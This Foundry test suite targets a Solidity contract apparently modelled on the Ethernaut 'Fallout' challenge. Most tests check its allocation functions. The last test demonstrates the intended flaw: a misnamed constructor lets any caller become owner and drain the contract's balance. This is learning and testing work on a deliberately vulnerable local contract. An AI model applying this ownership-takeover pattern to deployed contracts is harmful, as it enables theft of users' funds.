//SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";

pragma solidity ^0.8.18;

interface IFallOut {
    function Fal1out() external payable;

    function owner() external view returns (address);

    function allocate() external payable;

    function sendAllocation(address payable allocator) external;

    function collectAllocations() external;

    function allocatorBalance(
        address allocator
    ) external view returns (uint256);
}

contract TestFallout is Test {
    IFallOut public fallout_sol;
    address spider = makeAddr("spider");
    uint256 public constant STARTING_VALUE = 100 ether;

    modifier fall_Out() {
        vm.startPrank(spider);
        vm.deal(spider, STARTING_VALUE);
        _;
    }

    function setUp() public {
        address DeployedAddress = deployCode("FallOut.sol:Fallout_Sol");
        fallout_sol = IFallOut(DeployedAddress);
        vm.deal(spider, STARTING_VALUE);
    }

    /////////////////////////////////////
    //   FundamentalFunction tests     //
    /////////////////////////////////////

    function testFal1out() public {
        //Arrange
        address owner = fallout_sol.owner();
        //Act

        //Owners Act
        vm.startPrank(owner);
        vm.deal(owner, STARTING_VALUE);
        fallout_sol.Fal1out{value: 0.0001 ether}();
        vm.stopPrank();
        //Assert
        assert(spider != fallout_sol.owner());

        //Act
        //Spider Act
        vm.startPrank(spider);
        vm.deal(spider, STARTING_VALUE);
        fallout_sol.Fal1out{value: 0.0001 ether}();
        vm.stopPrank();
        //Assert
        assert(spider == fallout_sol.owner());
    }

    function testallocate() public fall_Out {
        //Arrange
        uint256 spiderBalance;

        //Act
        fallout_sol.allocate{value: 0.001 ether}();
        spiderBalance = fallout_sol.allocatorBalance(spider);
        console.log("Balance of Spider: ", spiderBalance);

        vm.stopPrank();
        //Assert
        assert(spiderBalance == 0.001 ether);
    }

    function testsendAllocation() public fall_Out {
        //Arrange
        vm.deal(address(fallout_sol), 10 ether);
        uint256 beforeBalance;
        uint256 afterBalance;

        //Act
        console.log("The balance of spider: ", payable(spider).balance);
        fallout_sol.allocate{value: 1 ether}();
        beforeBalance = address(fallout_sol).balance;
        console.log(
            "The balance of contract before sendAllocation: ",
            beforeBalance
        );
        fallout_sol.sendAllocation(payable(spider));
        afterBalance = address(fallout_sol).balance;
        console.log(
            "The balance of contract after sendAllocation is called: ",
            afterBalance
        );
        vm.stopPrank();
        //Assert
        assert(beforeBalance > afterBalance);
    }

    function testCollectAllocation() public fall_Out {
        //Spider test
        //Arrange
        address owner = fallout_sol.owner();
        uint256 before_balanceContract;
        uint256 after_balanceContract;
        uint256 before_OwnerBalance;
        uint256 after_OwnerBalance;

        vm.deal(address(fallout_sol), 15e18);
        //Act
        vm.expectRevert();
        console.log(spider, "is not the owner");
        fallout_sol.collectAllocations();
        vm.stopPrank();

        //The owner Test:
        //Arrange
        vm.startPrank(owner);
        vm.deal(owner, 10 ether);

        //Act
        before_OwnerBalance = owner.balance;
        console.log("the balance of owner before", before_OwnerBalance);
        before_balanceContract = address(fallout_sol).balance;
        console.log(
            "the balance of contract before collectAllocation",
            before_balanceContract
        );

        fallout_sol.collectAllocations();

        after_OwnerBalance = owner.balance;
        console.log("the balance of owner after", after_OwnerBalance);
        after_balanceContract = address(fallout_sol).balance;
        console.log(
            "the balance of contract befor collectAllocation",
            after_balanceContract
        );
        vm.stopPrank();

        //Assert
        assert(after_balanceContract < before_balanceContract);
        assert(before_OwnerBalance < after_OwnerBalance);
    }

    /////////////////////////////////////
    //      Vulnerbility tests         //
    /////////////////////////////////////

    function testOwnershipVulnerbility() public{
        //Arrange
        address owner = fallout_sol.owner();

        vm.startPrank(spider);
        vm.deal(spider, 10 ether);
        uint256 before_UserBalance;
        uint256 after_UserBalance;
        uint256 before_contractBalance;
        uint256 after_contractBalance;
        vm.deal(address(fallout_sol), 15e18);

        //Act
        fallout_sol.Fal1out{value: 1 ether}();

        before_contractBalance = address(fallout_sol).balance;
        before_UserBalance = spider.balance;
        console.log("The user Balance before: ", before_UserBalance);
        console.log("The contract before balance: ", before_contractBalance);

        fallout_sol.collectAllocations();

        after_contractBalance = address(fallout_sol).balance;
        after_UserBalance = spider.balance;

        console.log("The contract after balance: ", after_contractBalance);
        console.log("The User Balance: ", after_UserBalance);
    
        vm.stopPrank();

        //Assert
        assert(after_contractBalance < before_contractBalance);
        assert(after_contractBalance == 0);
        assert(before_UserBalance < after_UserBalance);
        assert(after_UserBalance > before_contractBalance);
    }
}
